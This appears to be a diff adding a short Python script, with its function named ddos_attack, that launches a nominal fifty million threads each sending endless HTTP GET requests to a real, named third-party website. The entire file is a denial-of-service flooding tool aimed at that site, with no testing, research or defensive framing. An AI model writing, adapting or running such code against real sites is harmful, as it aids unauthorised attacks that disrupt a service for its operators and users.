@@ -1,0 +1,26 @@
+import requests
+import threading
+
+target_url = "https://www.wpbeginner.com/"
+num_threads = 50000000
+
+def ddos_attack():
+    while True:
+        try:
+            response = requests.get(target_url)
+            print("Sent request to", target_url)
+        except requests.exceptions.RequestException as e:
+            print("Error:", e)
+
+threads = []
+
+for _ in range(num_threads):
+    thread = threading.Thread(target=ddos_attack)
+    thread.daemon = True
+    threads.append(thread)
+
+for thread in threads:
+    thread.start()
+
+for thread in threads:
+    thread.join()
